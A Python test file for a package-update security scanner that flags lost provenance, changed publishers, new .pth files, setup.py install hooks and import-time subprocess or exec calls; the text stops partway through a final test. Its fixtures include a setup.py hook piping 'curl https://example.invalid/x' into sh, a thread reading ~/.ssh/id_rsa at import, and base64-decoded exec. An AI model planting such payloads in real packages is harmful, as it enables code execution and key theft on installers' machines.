from dataclasses import replace

from garnet_guard.engine import run_checks
from garnet_guard.models import (
    CallSite,
    Change,
    FactError,
    ReleaseFacts,
    Severity,
    SourceMatch,
    TagInfo,
    UnparsedWheelFile,
    UnsourcedFile,
    Verdict,
    WheelDifference,
)
from tests.builders import prov, release
from tests.test_pyindex import SIX

CHANGE = Change("pypi", "demo", "1.0", "1.1")
INIT = "def hello():\n    return 1\n"
PAYLOAD = (
    "import subprocess, threading\n"
    "def _run():\n    subprocess.Popen(['python', 'demo/_rt/start.py'])\n"
    "threading.Thread(target=_run, daemon=True).start()\n"
)


def rules(base, cand) -> set[str]:
    return {f.rule_id for f in run_checks(CHANGE, base, cand).findings}


def test_clean_update_passes() -> None:
    result = run_checks(
        CHANGE,
        release("1.0", {"demo/__init__.py": INIT}),
        release("1.1", {"demo/__init__.py": INIT + "X=2\n"}),
    )
    assert result.verdict == Verdict.PASS and result.findings == ()


# GRN-T001
def test_lost_provenance_fires() -> None:
    assert "GRN-T001" in rules(release("1.0"), release("1.1", provenance="none"))


def test_lost_provenance_quiet_when_baseline_never_attested() -> None:
    assert "GRN-T001" not in rules(
        release("1.0", provenance="none"), release("1.1", provenance="none")
    )


def test_lost_provenance_unknown_is_not_pass() -> None:
    assert "GRN-E001" in rules(release("1.0"), release("1.1", provenance=None))


# GRN-T002 / T003
def test_publisher_changed_fires() -> None:
    cand = release(
        "1.1", provenance=prov("demo-1.1-py3-none-any.whl", repo="github.com/evil/r", repo_id="2")
    )
    assert "GRN-T002" in rules(release("1.0"), cand)


def test_publisher_rename_with_same_repo_id_is_quiet() -> None:
    cand = release(
        "1.1",
        provenance=prov("demo-1.1-py3-none-any.whl", repo="github.com/o/renamed", repo_id="1"),
    )
    assert "GRN-T002" not in rules(release("1.0"), cand)


def test_publisher_gitlab_project_with_github_repo_number_fires() -> None:
    # Fulcio puts GitLab project ids in the same extension as GitHub repository
    # ids; the same number on another host is a different repository.
    cand = release(
        "1.1",
        provenance=prov("demo-1.1-py3-none-any.whl", repo="gitlab.com/evil/r", repo_id="1"),
    )
    assert "GRN-T002" in rules(release("1.0"), cand)


def test_publisher_rename_with_same_repo_id_host_case_is_quiet() -> None:
    cand = release(
        "1.1",
        provenance=prov("demo-1.1-py3-none-any.whl", repo="GitHub.com/o/renamed", repo_id="1"),
    )
    assert "GRN-T002" not in rules(release("1.0"), cand)


def test_publisher_same_id_without_host_fires() -> None:
    cand = release(
        "1.1", provenance=prov("demo-1.1-py3-none-any.whl", repo="other:unknown", repo_id="1")
    )
    assert "GRN-T002" in rules(release("1.0"), cand)


def test_workflow_changed_fires() -> None:
    cand = release(
        "1.1", provenance=prov("demo-1.1-py3-none-any.whl", workflow=".github/workflows/other.yml")
    )
    assert rules(release("1.0"), cand) == {"GRN-T003"}


# GRN-T004
def test_missing_tag_fires_only_when_baseline_tagged() -> None:
    assert "GRN-T004" in rules(release("1.0"), release("1.1", tag=False))
    assert "GRN-T004" not in rules(release("1.0", tag=False), release("1.1", tag=False))


# GRN-T007
def test_invalid_attestation_blocks() -> None:
    cand = release("1.1", provenance=prov("demo-1.1-py3-none-any.whl", verified=False))
    result = run_checks(CHANGE, release("1.0"), cand)
    assert "GRN-T007" in {f.rule_id for f in result.findings}
    assert result.verdict == Verdict.BLOCK


# GRN-C001
def test_new_pth_fires() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo.pth": "import os; os.getcwd()\n"})
    assert rules(base, cand) == {"GRN-C001"}


def test_unchanged_path_pth_is_quiet() -> None:
    base = release("1.0", {"demo/__init__.py": INIT, "demo.pth": "/some/path\n"})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo.pth": "/some/path\n"})
    assert "GRN-C001" not in rules(base, cand)


def test_pth_gaining_import_line_fires() -> None:
    base = release("1.0", {"demo/__init__.py": INIT, "demo.pth": "/some/path\n"})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo.pth": "/some/path\nimport demo._boot\n"})
    assert "GRN-C001" in rules(base, cand)


# GRN-C003
def test_import_time_payload_fires() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release("1.1", {"demo/__init__.py": INIT + PAYLOAD})
    result = run_checks(CHANGE, base, cand)
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.severity == Severity.WARN
    assert "subprocess.Popen" in f.evidence[0].summary and "_run()" in f.evidence[0].summary


def test_existing_import_time_call_is_quiet() -> None:
    src = INIT + PAYLOAD
    assert "GRN-C003" not in rules(
        release("1.0", {"demo/__init__.py": src}), release("1.1", {"demo/__init__.py": src})
    )


# Libraries in the 974-update PyPI corpus whose own import-time calls are under a
# name in the §6.3 set, in the shape of their sources: requests reads its CA
# bundle path through certs.where(), urllib3 2.0 builds a PoolManager at import.
# Each pair is (files in both releases, files the new release adds or changes).
OWN_MODULE_CALLS: dict[str, tuple[dict[str, str], dict[str, str]]] = {
    "requests": (
        {
            "requests/__init__.py": "from . import utils\n",
            "requests/certs.py": "def where():\n    return 'cacert.pem'\n",
            "requests/utils.py": "from . import certs\n\nDEFAULT_CA_BUNDLE_PATH = certs.where()\n\n"
            "def extract_zipped_paths(path):\n    return path\n",
        },
        {
            "requests/adapters.py": "from .utils import DEFAULT_CA_BUNDLE_PATH, extract_zipped_paths\n"
            "\nCA_PATH = extract_zipped_paths(DEFAULT_CA_BUNDLE_PATH)\n"
        },
    ),
    "urllib3": (
        {
            "urllib3/__init__.py": "from .poolmanager import PoolManager\n",
            "urllib3/poolmanager.py": "class PoolManager:\n    pass\n",
        },
        {
            "urllib3/__init__.py": "from .poolmanager import PoolManager\n\n_DEFAULT_POOL = PoolManager()\n"
        },
    ),
    "httpx": (
        {"httpx/__init__.py": "", "httpx/_config.py": "class Limits:\n    pass\n"},
        {"httpx/_client.py": "from ._config import Limits\n\nDEFAULT_LIMITS = Limits()\n"},
    ),
    "aiohttp": (
        {
            "aiohttp/__init__.py": "",
            "aiohttp/helpers.py": "def set_result(fut, result):\n    return result\n",
        },
        {"aiohttp/__init__.py": "from .helpers import set_result\n\nset_result(None, None)\n"},
    ),
    "setuptools": (
        {
            "setuptools/__init__.py": "",
            "setuptools/_distutils/__init__.py": "",
            "setuptools/_distutils/spawn.py": "def spawn(cmd):\n    return cmd\n",
        },
        {"setuptools/__init__.py": "from ._distutils.spawn import spawn\n\nspawn(['true'])\n"},
    ),
}


def test_a_library_in_the_set_calling_its_own_modules_at_import_is_quiet() -> None:
    for package, (both, added) in OWN_MODULE_CALLS.items():
        base = release("1.0", both, package=package)
        cand = release("1.1", {**both, **added}, package=package)
        result = run_checks(Change("pypi", package, "1.0", "1.1"), base, cand)
        assert "GRN-C003" not in {f.rule_id for f in result.findings}, package
        # The same files shipped by another project are not that library's code.
        assert "GRN-C003" in rules(release("1.0", both), release("1.1", {**both, **added})), package


def test_a_module_named_like_a_library_is_still_followed() -> None:
    # Where requests isn't installed, Python imports demo's requests.py, so a
    # function there that import-time code calls or hands to a thread is read.
    stub = "import subprocess\n\ndef post():\n    subprocess.Popen(['python', 'demo/_rt.py'])\n"
    for init, want in (
        (
            "import requests, threading\n\nthreading.Thread(target=requests.post).start()\n",
            ["new module requests.py:4 calls subprocess.Popen (in post(), reached at import"],
        ),
        (
            "import requests\n\nrequests.post()\n",
            [
                "demo/__init__.py:5 calls requests.post",
                "new module requests.py:4 calls subprocess.Popen (in post(), reached at import",
            ],
        ),
    ):
        cand = release("1.1", {"demo/__init__.py": INIT + init, "requests.py": stub})
        result = run_checks(CHANGE, release("1.0", {"demo/__init__.py": INIT}), cand)
        [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
        assert f.severity == Severity.WARN
        got = sorted(e.summary for e in f.evidence)
        assert len(got) == len(want), got
        assert all(g.startswith(w) for g, w in zip(got, sorted(want), strict=True)), got


def test_subprocess_inside_uncalled_function_is_quiet() -> None:
    src = INIT + "import subprocess\ndef run():\n    subprocess.run(['ls'])\n"
    assert "GRN-C003" not in rules(
        release("1.0", {"demo/__init__.py": INIT}), release("1.1", {"demo/__init__.py": src})
    )


def test_moved_unchanged_module_is_quiet() -> None:
    vendored = "import os\nos.system('true')\n"
    base = release("1.0", {"demo/__init__.py": INIT, "demo/_lib/compat.py": vendored})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo/_external/compat.py": vendored})
    assert "GRN-C003" not in rules(base, cand)


def test_moved_and_changed_module_fires() -> None:
    vendored = "import os\nos.system('true')\n"
    base = release("1.0", {"demo/__init__.py": INIT, "demo/_lib/compat.py": vendored})
    cand = release(
        "1.1", {"demo/__init__.py": INIT, "demo/_external/compat.py": vendored + "X = 1\n"}
    )
    assert "GRN-C003" in rules(base, cand)


def test_moved_vendored_package_with_edits_compares_to_old_path() -> None:
    old = "import os\nos.system('true')\n"
    base = release("1.0", {"demo/__init__.py": INIT, "demo/_lib/compat/numpy/__init__.py": old})
    moved = {"demo/__init__.py": INIT, "demo/_external/compat/numpy/__init__.py": old + "X = 1\n"}
    assert "GRN-C003" not in rules(base, release("1.1", moved))
    moved["demo/_external/compat/numpy/__init__.py"] = old + "exec('1')\n"
    assert "GRN-C003" in rules(base, release("1.1", moved))


# GRN-C003 in test files
TEST_PAYLOAD = "import importlib\nMODS = [importlib.import_module(m) for m in ('a', 'b')]\n"


def c003(base, cand):
    return [f for f in run_checks(CHANGE, base, cand).findings if f.rule_id == "GRN-C003"]


def test_test_file_reports_at_info() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo/tests/test_api.py": TEST_PAYLOAD})
    [f] = c003(base, cand)
    assert f.severity == Severity.INFO and f.default_severity == Severity.WARN
    assert "test module(s)" in f.title
    assert run_checks(CHANGE, base, cand).verdict == Verdict.PASS


def test_conftest_and_test_prefix_count_as_tests() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    for path in ("conftest.py", "demo/test_util.py"):
        [f] = c003(base, release("1.1", {"demo/__init__.py": INIT, path: TEST_PAYLOAD}))
        assert f.severity == Severity.INFO, path


def test_test_file_imported_by_package_code_warns() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    for importer in (
        "from .tests import _boot\n",
        "import demo.tests._boot\n",
        "from demo.tests import _boot\n",
        "from . import tests\n",  # tests/__init__.py imports _boot
    ):
        cand = release(
            "1.1",
            {
                "demo/__init__.py": INIT + importer,
                "demo/tests/__init__.py": "from . import _boot\n",
                "demo/tests/_boot.py": PAYLOAD,
            },
        )
        [f] = c003(base, cand)
        assert f.severity == Severity.WARN, importer


def test_test_file_named_by_entry_point_warns() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release(
        "1.1",
        {
            "demo/__init__.py": INIT,
            "demo/tests/plugin.py": PAYLOAD,
            "demo-1.1.dist-info/entry_points.txt": "[pytest11]\ndemo = demo.tests.plugin\n",
        },
    )
    [f] = c003(base, cand)
    assert f.severity == Severity.WARN


def test_test_and_package_findings_are_separate() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release(
        "1.1", {"demo/__init__.py": INIT + PAYLOAD, "demo/tests/test_api.py": TEST_PAYLOAD}
    )
    assert sorted(f.severity for f in c003(base, cand)) == [Severity.INFO, Severity.WARN]


# GRN-T004 messages
def test_tag_finding_names_each_repo() -> None:
    base = replace(
        release("1.0"), source_repo="scipy/scipy", tag=TagInfo("v1.0", "abc", "scipy/scipy")
    )
    cand = replace(
        release("1.1", tag=False),
        source_repo="scipy/scipy-release",
        tag_repos=("scipy/scipy-release", "scipy/scipy"),
    )
    [f] = [f for f in run_checks(CHANGE, base, cand).findings if f.rule_id == "GRN-T004"]
    assert f.title == (
        "1.0 has a tag in github.com/scipy/scipy, "
        "but github.com/scipy/scipy-release or github.com/scipy/scipy has none for 1.1"
    )
    assert f.evidence[0].url == "https://github.com/scipy/scipy/tree/v1.0"


# errors
def test_fact_errors_become_findings() -> None:
    cand = replace(
        release("1.1"), errors=(FactError("GRN-E001", "OSV lookup failed", ("GRN-K001",)),)
    )
    result = run_checks(CHANGE, release("1.0"), cand)
    assert [f.rule_id for f in result.findings] == ["GRN-E001"]
    assert result.verdict == Verdict.WARN


def test_known_malicious_blocks() -> None:
    cand = replace(release("1.1"), advisories=("MAL-2026-1",), advisories_checked=True)
    assert run_checks(CHANGE, release("1.0"), cand).verdict == Verdict.BLOCK


def test_unparseable_new_file_is_e002() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo/x.py": "print 'py2'\n"})
    assert "GRN-E002" in rules(base, cand)


def test_payload_through_lambda_or_class_init_fires() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    lam = INIT + "import os\n(lambda: os.system('id'))()\n"
    cls = (
        INIT
        + "import os\nclass _Boot:\n    def __init__(self):\n        os.system('id')\n_Boot()\n"
    )
    assert "GRN-C003" in rules(base, release("1.1", {"demo/__init__.py": lam}))
    assert "GRN-C003" in rules(base, release("1.1", {"demo/__init__.py": cls}))


def test_base64_into_existing_exec_fires() -> None:
    # typing-inspection builds helpers with exec at import; a release that starts
    # decoding what it execs is a new thing, not the same call.
    old = INIT + "exec('X = 1')\n"
    new = old + "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))\n"
    base = release("1.0", {"demo/__init__.py": old})
    [f] = [f for f in run_checks(CHANGE, base, release("1.1", {"demo/__init__.py": new})).findings]
    assert f.rule_id == "GRN-C003"
    assert "base64.b64decode → exec" in f.evidence[0].summary
    assert "GRN-C003" not in rules(base, release("1.1", {"demo/__init__.py": old + "Y = 2\n"}))


def test_a_vendored_six_names_the_exec_its_python_2_branch_runs() -> None:
    # mpmath 0.18 added six, whose Python 2 branch defines exec_ and calls it
    # at once. The finding is true (exec runs at import under Python 2) and
    # still warns; its second line used to say the call to exec_ called
    # builtins.exec, the value exec_ gets in the Python 3 branch.
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo/six.py": SIX})
    (f,) = c003(base, cand)
    assert f.severity == Severity.WARN
    assert [e.summary for e in f.evidence] == [
        "new module demo/six.py:9 calls exec (in exec_(), reached at import)"
    ]


# GRN-C002: setup.py anywhere, and releases without a trusted sdist
SETUP = "from setuptools import setup\nsetup(name='demo')\n"
SETUP_HOOK = (
    "import os\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n"
    "class PostInstall(install):\n    def run(self):\n        install.run(self)\n"
    "        os.system('curl https://example.invalid/x | sh')\n\n"
    "setup(name='demo', cmdclass={'install': PostInstall})\n"
)
SRC = {"demo/__init__.py": INIT, "setup.py": SETUP}


def _sdist(version: str, files: dict[str, str]) -> ReleaseFacts:
    return release(version, sdist_files=files, sdist_only=True)


def test_setup_py_install_hook_fires() -> None:
    # The classic shape: a cmdclass whose run() fetches and executes something.
    result = run_checks(CHANGE, _sdist("1.0", SRC), _sdist("1.1", {**SRC, "setup.py": SETUP_HOOK}))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C002"]
    assert "setup.py:8 calls os.system (in PostInstall.run())" in f.evidence[0].summary


def test_sdist_only_release_after_wheel_only_is_still_compared() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = _sdist(
        "1.1", {"demo/__init__.py": INIT + "import os\nos.system('id')\n", "setup.py": SETUP_HOOK}
    )
    result = run_checks(CHANGE, base, cand)
    ids = {f.rule_id for f in result.findings}
    assert {"GRN-C002", "GRN-C003"} <= ids
    [c003] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert "different kinds of files" in c003.evidence[-1].summary


def test_a_first_wheel_is_compared_with_the_trusted_sdist() -> None:
    # pip installs the new wheel, so what it adds counts even when the sdist
    # uploaded beside it is as clean as the trusted one.
    base = _sdist("1.0", SRC)
    wheel = {"demo/__init__.py": INIT + "import os\nos.system('id')\n", "demo.pth": "import os\n"}
    result = run_checks(CHANGE, base, release("1.1", wheel, sdist_files=SRC))
    c001, c003 = (
        next(f for f in result.findings if f.rule_id == rule) for rule in ("GRN-C001", "GRN-C003")
    )
    assert "different kinds of files" in c001.evidence[-1].summary
    assert "different kinds of files" in c003.evidence[-1].summary
    # Releases that both ship a wheel still compare wheels, and sdists only when neither does.
    assert rules(base, _sdist("1.1", SRC)) == set()


def test_a_first_wheel_and_its_sdist_are_both_read() -> None:
    # pip builds the sdist where no wheel fits, so what only the sdist adds
    # still counts; what both add is reported once.
    base = _sdist("1.0", SRC)
    payload = INIT + "import os\nos.system('id')\n"
    in_sdist = release(
        "1.1", {"demo/__init__.py": INIT}, sdist_files={**SRC, "demo/__init__.py": payload}
    )
    assert "GRN-C003" in rules(base, in_sdist)
    in_both = release(
        "1.1", {"demo/__init__.py": payload}, sdist_files={**SRC, "demo/__init__.py": payload}
    )
    c003 = [f for f in run_checks(CHANGE, base, in_both).findings if f.rule_id == "GRN-C003"]
    assert len(c003) == 1


def test_a_first_wheel_of_an_src_layout_matches_the_trusted_sdist() -> None:
    # The sdist's src/ folder isn't part of the installed name: an unchanged
    # .pth, unparsable template and sourceless .pyc are the same files.
    files = {
        "demo/__init__.py": INIT,
        "demo/template.py": "def {{ name }}():\n    return 1\n",
        "demo/_compat.pyc": b"\0" * 16,
        "demo.pth": "/some/path\n",
    }
    sdist = {"setup.py": SETUP, **{f"src/{k}": v for k, v in files.items()}}
    assert rules(_sdist("1.0", sdist), release("1.1", files, sdist_files=sdist)) == set()


def test_the_other_wheels_of_a_first_wheel_are_read_once() -> None:
    # GRN-C012's wheels are compared with the wheel Garnet read, not once for
    # each way the content rules read a first wheel and its sdist.
    win = "demo-1.1-cp312-cp312-win_amd64.whl"
    cand = replace(
        release("1.1", {"demo/__init__.py": INIT}, sdist_files=SRC),
        wheel_unparsed=(UnparsedWheelFile(win, "Windows", "demo/x.py", "a" * 64),),
    )
    result = run_checks(CHANGE, _sdist("1.0", SRC), cand)
    (e002,) = [f for f in result.findings if f.rule_id == "GRN-E002"]
    assert e002.title.endswith("compare with demo-1.1-py3-none-any.whl")


def test_a_first_wheel_that_doesnt_parse_lowers_grn_c012_as_grn_e002_warns() -> None:
    # GRN-E002 warns for the first wheel's changed copy, read against the
    # trusted sdist, so GRN-C012's line for that file is listed at info.
    py2 = "print 'hi'\n"
    win = "demo-1.1-cp312-cp312-win_amd64.whl"
    call = CallSite("os.system", 2)
    cand = replace(
        release(
            "1.1",
            {"demo/__init__.py": py2 + "# 1.1\n"},
            sdist_files={**SRC, "demo/__init__.py": py2},
        ),
        wheel_differences=(
            WheelDifference(
                win, "Windows", "demo/__init__.py", True, (call,), read_copy_parsed=False
            ),
        ),
        wheel_families=("any", "Windows"),
    )
    result = run_checks(CHANGE, _sdist("1.0", {**SRC, "demo/__init__.py": py2}), cand)
    (c012,) = [f for f in result.findings if f.rule_id == "GRN-C012"]
    assert c012.severity is Severity.INFO
    assert "GRN-E002" in {f.rule_id for f in result.findings}
    assert result.verdict is Verdict.WARN


def test_setup_py_in_a_release_that_adds_an_sdist_counts_as_new() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release("1.1", {"demo/__init__.py": INIT}, sdist_files={**SRC, "setup.py": SETUP_HOOK})
    assert "GRN-C002" in rules(base, cand)
    # Not when the trusted sdist exists but couldn't be read: that is GRN-E001's job.
    base_unread = release("1.0", {"demo/__init__.py": INIT}, sdist_files=None)
    base_unread = replace(
        base_unread,
        artifacts=base_unread.artifacts
        + release("1.0", sdist_files={}, sdist_only=True).artifacts[:1],
    )
    unread = replace(base_unread.artifacts[1], inspected=False)
    base_unread = replace(base_unread, artifacts=(base_unread.artifacts[0], unread))
    assert "GRN-C002" not in rules(base_unread, cand)


def test_setup_py_that_starts_running_a_file_for_its_version_warns() -> None:
    # runpy and the importlib file loaders run the file they load, so a setup.py
    # that switches to one to read __version__ is reported (docs/rules/GRN-C002.md).
    for line, name in (
        ("v = runpy.run_path('demo/__about__.py')['__version__']\n", "runpy.run_path"),
        ("s = util.spec_from_file_location('a', 'demo/__about__.py')\n", "importlib.util"),
    ):
        setup = "import runpy\nfrom importlib import util\n" + line + SETUP
        result = run_checks(CHANGE, _sdist("1.0", SRC), _sdist("1.1", {**SRC, "setup.py": setup}))
        [f] = [f for f in result.findings if f.rule_id == "GRN-C002"]
        assert f.evidence[0].summary.startswith(f"setup.py:3 calls {name}")


def test_unchanged_setup_py_hook_is_quiet() -> None:
    assert "GRN-C002" not in rules(
        _sdist("1.0", {**SRC, "setup.py": SETUP_HOOK}),
        _sdist("1.1", {**SRC, "setup.py": SETUP_HOOK}),
    )


# GRN-C001: where a .pth lands
def test_pth_under_the_versioned_data_folder_is_the_same_file() -> None:
    base = release(
        "1.0", {"demo/__init__.py": INIT, "demo-1.0.data/purelib/demo.pth": "import demo\n"}
    )
    cand = release(
        "1.1", {"demo/__init__.py": INIT, "demo-1.1.data/purelib/demo.pth": "import demo\n"}
    )
    assert "GRN-C001" not in rules(base, cand)
    gained = release(
        "1.1",
        {
            "demo/__init__.py": INIT,
            "demo-1.1.data/purelib/demo.pth": "import demo\nimport demo._boot\n",
        },
    )
    assert "GRN-C001" in rules(base, gained)


def test_pth_outside_site_packages_root_never_runs() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    nested = release("1.1", {"demo/__init__.py": INIT, "demo/data/x.pth": "import os\n"})
    scripts = release(
        "1.1", {"demo/__init__.py": INIT, "demo-1.1.data/scripts/x.pth": "import os\n"}
    )
    assert "GRN-C001" not in rules(base, nested)
    assert "GRN-C001" not in rules(base, scripts)
    assert "GRN-C001" in rules(
        base,
        release("1.1", {"demo/__init__.py": INIT, "demo-1.1.data/platlib/x.pth": "import os\n"}),
    )


def test_renamed_pth_with_the_same_lines_is_quiet() -> None:
    line = "import sys, types, os; p = os.path.join(sys._getframe(1).f_locals['sitedir'], 'demo')\n"
    base = release("1.0", {"demo/__init__.py": INIT, "demo-1.0-py3.9-nspkg.pth": line})
    assert "GRN-C001" not in rules(
        base, release("1.1", {"demo/__init__.py": INIT, "demo-1.1-py3.9-nspkg.pth": line})
    )
    assert "GRN-C001" in rules(
        base,
        release(
            "1.1",
            {"demo/__init__.py": INIT, "demo-1.1-py3.9-nspkg.pth": line + "import demo._boot\n"},
        ),
    )


def test_modules_under_purelib_keep_their_names_across_versions() -> None:
    mod = "import os\nos.system('id')\n"
    base = release("1.0", {"demo-1.0.data/purelib/demo/__init__.py": mod})
    cand = release("1.1", {"demo-1.1.data/purelib/demo/__init__.py": mod + "X = 1\n"})
    assert "GRN-C003" not in rules(base, cand)


# GRN-C003 across modules
def test_payload_reached_through_another_module_at_import_fires() -> None:
    # The memoryos 2.0.34 shape: a module-level get_logger() call, a same-module
    # helper, a function-local import, and the process start two modules away.
    base = {
        "memos/__init__.py": "from memos.api import client\n",
        "memos/api/__init__.py": "",
        "memos/api/client.py": "from memos.log import get_logger\nlogger = get_logger(__name__)\n",
        "memos/log.py": "def get_logger(name):\n    return name\n",
    }
    cand = {
        **base,
        "memos/log.py": (
            "def configure():\n    from memos._stage0 import trigger\n    trigger()\n\n"
            "def get_logger(name):\n    configure()\n    return name\n"
        ),
        "memos/_stage0.py": "import subprocess\n\ndef trigger():\n    subprocess.Popen(['memos/.sckit/bin'])\n",
    }
    result = run_checks(CHANGE, release("1.0", base), release("1.1", cand))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.evidence[0].summary == (
        "new module memos/_stage0.py:4 calls subprocess.Popen "
        "(in trigger(), reached at import from memos/api/client.py)"
    )


def test_nested_function_started_on_a_thread_at_import_fires() -> None:
    # The mrmustard 0.7.4 shape: __init__ calls a checker at import, which
    # starts a thread on a function defined inside it.
    cand = {
        "demo/__init__.py": (
            "import threading\n\n"
            "def _check_tf_compatibility():\n"
            "    def _run():\n"
            "        import subprocess\n"
            "        subprocess.check_output(['sh', '-c', 'cat ~/.ssh/id_rsa'])\n"
            "    threading.Thread(target=_run, daemon=True).start()\n\n"
            "_check_tf_compatibility()\n"
        )
    }
    result = run_checks(CHANGE, release("1.0", {"demo/__init__.py": ""}), release("1.1", cand))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.evidence[0].summary == (
        "demo/__init__.py:6 calls subprocess.check_output (in _run(), reached at import)"
    )


def test_module_the_trusted_version_could_not_parse_is_not_called_new() -> None:
    # multiprocess 0.70.12.2: the trusted wheel was built for Python 2, so its
    # copy of the module never parsed; the calls may be old.
    base = {"demo/__init__.py": "", "demo/work.py": "import os\nprint 'py2'\nos.system('x')\n"}
    cand = {"demo/__init__.py": "", "demo/work.py": "import os\nos.system('x')\n"}
    result = run_checks(CHANGE, release("1.0", base), release("1.1", cand))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert (
        f.title
        == "1.1 calls sensitive APIs at import in 1 module(s) whose 1.0 copy couldn't be parsed"
    )
    assert f.evidence[0].summary == "demo/work.py:2 calls os.system"
    assert f.evidence[1].summary == (
        "1.0 has demo/work.py too, but it couldn't be parsed, so these calls may not be new"
    )
    mixed = {**cand, "demo/new.py": "import os\nos.system('y')\n"}
    [f] = [
        f
        for f in run_checks(CHANGE, release("1.0", base), release("1.1", mixed)).findings
        if f.rule_id == "GRN-C003"
    ]
    assert f.title == "1.1 adds import-time calls to sensitive APIs in 2 module(s)"


def test_module_renamed_with_a_leading_underscore_is_the_same_module() -> None:
    # html5lib 1.0 renamed inputstream.py to _inputstream.py.
    body = "import socket\n\nsock = socket.socket()\n"
    base = {"demo/__init__.py": "", "demo/inputstream.py": body}
    cand = {"demo/__init__.py": "", "demo/_inputstream.py": body + "# 1.1\n"}
    assert "GRN-C003" not in rules(release("1.0", base), release("1.1", cand))
    worse = {"demo/__init__.py": "", "demo/_inputstream.py": body + "import os\nos.system('x')\n"}
    assert "GRN-C003" in rules(release("1.0", base), release("1.1", worse))


def test_function_handed_to_a_call_that_may_not_run_it_is_info() -> None:
    # huggingface-hub 1.32.0 handed a function to a factory; modal 1.6.0 to a
    # sync wrapper. Nothing in the source says the receiver runs it.
    cand = {
        "demo/__init__.py": (
            "import subprocess\nfrom functools import partial\n\n"
            "def _run():\n    subprocess.run(['x'])\n\nrunner = partial(_run)\n"
        )
    }
    result = run_checks(CHANGE, release("1.0", {"demo/__init__.py": ""}), release("1.1", cand))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.severity == Severity.INFO
    assert (
        f.title
        == "1.1 hands functions that call sensitive APIs to other calls at import in 1 module(s)"
    )
    assert f.evidence[0].summary == (
        "demo/__init__.py:5 calls subprocess.run (in _run(), handed to functools.partial() at import)"
    )
    # Handed to something that runs it (lightning, mrmustard): a warning, as before.
    thread = {
        "demo/__init__.py": cand["demo/__init__.py"] + "import threading\n"
        "threading.Thread(target=_run, daemon=True).start()\n"
    }
    result = run_checks(CHANGE, release("1.0", {"demo/__init__.py": ""}), release("1.1", thread))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.severity == Severity.WARN
    assert f.evidence[0].summary == (
        "demo/__init__.py:5 calls subprocess.run (in _run(), reached at import)"
    )


def test_chain_that_starts_in_a_test_file_is_info() -> None:
    # passlib 1.6, skops 0.8.0: the call sits in a package module, but only a
    # test file nothing imports reaches it at import.
    util = "import subprocess\n\ndef go():\n    subprocess.run(['x'])\n"
    base = {
        "demo/__init__.py": "",
        "demo/util.py": util,
        "demo/tests/test_x.py": "from demo.util import go\n",
    }
    cand = {**base, "demo/tests/test_x.py": "from demo.util import go\ngo()\n"}
    result = run_checks(CHANGE, release("1.0", base), release("1.1", cand))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.severity == Severity.INFO
    assert f.evidence[0].summary == (
        "demo/util.py:4 calls subprocess.run (in go(), reached at import from demo/tests/test_x.py)"
    )


def test_sdist_files_outside_the_package_are_info() -> None:
    # ply 3.6 (example/), mpmath 1.2.1 (demo/), flask-login 0.5.0 (docs/conf.py).
    base = {"demo/__init__.py": "", "docs/conf.py": "project = 'demo'\n"}
    cand = {**base, "docs/conf.py": "import os\nos.system('make html')\n"}
    result = run_checks(
        CHANGE,
        release("1.0", sdist_files=base, sdist_only=True),
        release("1.1", sdist_files=cand, sdist_only=True),
    )
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.severity == Severity.INFO
    assert f.title == (
        "1.1 adds import-time calls to sensitive APIs reached only from 1 file(s) "
        "outside the package"
    )
    inside = {**base, "demo/__init__.py": "import os\nos.system('x')\n"}
    result = run_checks(
        CHANGE,
        release("1.0", sdist_files=base, sdist_only=True),
        release("1.1", sdist_files=inside, sdist_only=True),
    )
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.severity == Severity.WARN


def test_chain_that_starts_outside_the_package_is_info() -> None:
    # ply 3.6: example/ansic/clex.py builds a lexer at import; the exec sits
    # in ply/lex.py, which nothing in the package runs at import.
    util = "import subprocess\n\ndef go():\n    subprocess.run(['x'])\n"
    base = {
        "demo/__init__.py": "",
        "demo/util.py": util,
        "example/run.py": "from demo.util import go\n",
    }
    cand = {**base, "example/run.py": "from demo.util import go\ngo()\n"}
    result = run_checks(
        CHANGE,
        release("1.0", sdist_files=base, sdist_only=True),
        release("1.1", sdist_files=cand, sdist_only=True),
    )
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.severity == Severity.INFO
    assert f.title == (
        "1.1 adds import-time calls to sensitive APIs reached only from 1 file(s) "
        "outside the package"
    )
    assert f.evidence[0].summary == (
        "demo/util.py:4 calls subprocess.run (in go(), reached at import from example/run.py)"
    )


def test_top_level_test_folder_counts_as_tests_but_one_in_the_package_does_not() -> None:
    # ply 3.6: test/calclex.py builds a lexer at import and the exec sits in
